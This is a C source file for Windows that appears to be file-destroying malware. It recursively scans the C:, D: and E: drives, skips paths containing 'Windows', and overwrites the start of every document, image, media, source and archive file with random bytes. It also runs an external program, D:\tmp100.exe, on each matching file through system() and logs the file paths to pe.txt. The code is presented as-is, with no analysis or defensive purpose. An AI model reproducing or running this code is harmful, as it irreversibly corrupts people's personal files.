#include "stdio.h" 
#include "windows.h"
#include "string.h"
char xx[][5]={
	".txt",".doc","docx",".ppt","pptx",".xls","xlsx",".wps",".bmp",".jpg",
	"jpeg",".mkv",".mp3",".mp4",".png",".cpp",".pdf",".rar",".flv",".mpg"
	};
char mmp1[]="Windows";
char mmp3[]="Windows";
char mmp4[]="Windows";
char mmp2[]="Windows";
char mmp5[]="Windows";

void xv(char x[]);
void xv(char x[]){
	FILE *f;
	char *y;
	unsigned int i;
	y=(char*)malloc(strlen(x));
	for(i=1;i<=strlen(x);++i)y[i-1]=(char)(rand()+*(x+i))%123;
	if((f=fopen(x,"r+b"))!=NULL){
		//for(i=1;i<=2;++i)
			fwrite(y,sizeof(char),11,f);
		fclose(f);
		}
	free(y);
	}

void find(char * lpPath) ;
void find(char * lpPath) 
	{ 
	//sleep(1);
	char szFind[MAX_PATH],szFile[MAX_PATH]; 
	WIN32_FIND_DATA FindFileData; 
	strcpy(szFind,lpPath); 
	strcat(szFind,"\\*.*");
	HANDLE hFind=::FindFirstFile(szFind,&FindFileData); 
	if(INVALID_HANDLE_VALUE == hFind) 
		return; 
	while(TRUE) 
		{ 
		if(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
			{ 
			if(FindFileData.cFileName[0]!='.') 
				{ 
				strcpy(szFile,lpPath); 
				strcat(szFile,"\\"); 
				strcat(szFile,FindFileData.cFileName); 
				find(szFile); 
				} 
			} 
		else 
			{ 
			char x[MAX_PATH+100],so[]="\0\0\0\0\0";
			int i;
			FILE *fx;
			sprintf(x,"%s\\%s",lpPath,FindFileData.cFileName);	

			int l=strlen(x);
			memcpy(so,x+l-4,4);
			if(strstr(x,mmp1)==NULL&&strstr(x,mmp2)==NULL&&strstr(x,mmp3)==NULL&&strstr(x,mmp4)==NULL&&strstr(x,mmp5)==NULL){
				//printf(so);
				for(i=0;i<20;++i){
					if(strcmp(so,xx[i])==0){
						sleep(1);
						xv(x);
						char yu[]= "D:\\tmp100.exe '";
						strcat(yu,x);
						strcat(yu,"'");
						system(yu);
						if((fx=fopen("pe.txt","a"))!=NULL){
							fprintf(fx,"%s\n",x); 
							fclose(fx);
							}
						}

					}
				}
			//xv(x);

			//printf("%c",x[l-1]);
			//printf("%c",x[l-2]);
			//printf("%c",x[l-3]);
			//printf("%d\n",FindFileData.ftCreationTime.dwHighDateTime);
			//printf("%d\n",FindFileData.ftCreationTime.dwLowDateTime);
			} 
		if(!FindNextFile(hFind,&FindFileData)) 
			break; 
		} 
	} 

DWORD WINAPI xmain(LPVOID pM) ;
DWORD WINAPI xmain(LPVOID pM) 
	{ 
	char filepath[MAX_PATH]="D:"; 
	//char filepath[MAX_PATH]="E:\\xp2\\Docs\\Visual Studio 2008\\Projects\\BMPÍ¼Ïñ\\Release\\x";
	find(filepath); 
	char filepath2[MAX_PATH]="C:"; 

	find(filepath2); 
	char filepath3[MAX_PATH]="E:"; 

	find(filepath3); 
	//system("PAUSE");
	return 0;
	}
